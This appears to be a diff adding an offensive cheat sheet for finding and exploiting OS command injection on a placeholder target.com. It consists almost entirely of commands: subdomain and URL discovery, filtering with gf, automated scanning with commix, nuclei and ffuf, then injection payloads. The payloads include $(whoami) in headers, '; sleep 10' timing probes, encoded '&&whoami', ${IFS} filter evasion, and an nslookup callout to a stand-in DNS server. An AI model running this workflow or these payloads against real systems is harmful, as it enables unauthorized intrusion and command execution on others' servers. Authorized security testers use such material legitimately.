@@ -1,0 +1,60 @@
+                                 COMMAND INJECTION RECON PROCESS
+
+# 1. Subdomain Enumeration
+
+---> subfinder -d target.com | tee subdomains.txt
+
+# 2. URL and Path Discovery
+
+---> gau target.com | tee urls.txt
+
+# 3. Filter for Command Injection Vulnerable Endpoints using gf
+
+---> cat urls.txt | gf command-injection | tee cmd_injection_candidates.txt
+
+# 4. Scan Command Injection Candidates with Commix
+
+---> cat cmd_injection_candidates.txt | xargs -I{} commix --url={} --batch
+
+                       (OR)
+
+---> nuclei -t cves/2021/command-injection.yaml -u https://target.com
+
+# 5. Fuzz Parameters for Command Injection Vulnerabilities
+
+---> ffuf -u https://target.com/FUZZ -w /path/to/wordlist.txt -H "User-Agent: $(id)" -o ffuf-results.json
+
+ADDTIONAL METHODS TO BYPASS
+
+#1. Header-based Injection
+---> curl -H "User-Agent: $(whoami)" https://target.com
+
+#2. DNS Blind Command Injection Detection
+
+---> ; nslookup yourdnsserver.com && ping -c 1 yourdnsserver.com
+
+#3 .  Time-based Blind Injection
+
+---> ; sleep 10
+&& ping -c 5 localhost
+
+#4 . URL Encoding:
+
+--->  %26%26whoami
+
+#5. Whitespace Manipulation
+
+---> ; ping${IFS}-c${IFS}4${IFS}localhost
+
+
+
+
+
+
+
+
+
+
+
+
+
